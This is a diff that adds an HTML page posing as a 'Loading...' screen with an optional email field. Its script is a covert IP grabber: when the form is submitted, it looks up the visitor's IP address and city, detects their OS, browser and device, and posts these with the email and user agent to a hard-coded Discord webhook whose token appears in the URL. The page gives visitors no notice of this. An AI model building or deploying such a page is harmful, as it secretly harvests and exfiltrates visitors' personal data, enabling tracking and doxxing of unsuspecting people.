@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Loading...</title>
+</head>
+<body>
+
+<h2>Loading...</h2>
+
+<form id="form">
+<input type="email" id="email" placeholder="Enter email (optional)">
+<button type="submit">Continue</button>
+</form>
+
+<script>
+let startTime = Date.now();
+
+async function collectData(emailValue){
+
+try{
+
+// get IP + location
+let res = await fetch("https://ipapi.co/json/");
+let data = await res.json();
+
+// device type
+let device = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
+
+// runtime
+let runtime = (Date.now() - startTime) + " ms";
+
+// OS detection
+let os = "Unknown";
+if(navigator.userAgent.includes("Windows")) os="Windows";
+else if(navigator.userAgent.includes("Android")) os="Android";
+else if(navigator.userAgent.includes("Linux")) os="Linux";
+else if(navigator.userAgent.includes("Mac")) os="MacOS";
+else if(navigator.userAgent.includes("iPhone")) os="iOS";
+
+// browser detection
+let browser="Unknown";
+if(navigator.userAgent.includes("Chrome")) browser="Chrome";
+if(navigator.userAgent.includes("Firefox")) browser="Firefox";
+if(navigator.userAgent.includes("Safari")) browser="Safari";
+if(navigator.userAgent.includes("Edg")) browser="Edge";
+
+// webhook
+await fetch("https://discord.com/api/webhooks/1481661221790023710/hThn3wMMdPQreiO0e-OeKcpS7RjPfW2CFHo8FFFBVA0GOTq86IzYadgpJQvEf9psIG-O",{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+content:
+` IP: ${data.ip}
+ Location: ${data.city}, ${data.country_name}
+ OS: ${os}
+ Browser: ${browser}
+ Device: ${device}
+ Time: ${new Date().toString()}
+ Runtime: ${runtime}
+ Email: ${emailValue || "Not provided"}
+ UserAgent: ${navigator.userAgent}`
+})
+});
+
+}catch(e){
+console.log(e);
+}
+
+}
+
+document.getElementById("form").addEventListener("submit",function(e){
+e.preventDefault();
+let email = document.getElementById("email").value;
+collectData(email);
+});
+</script>
+
+</body>
+</html>
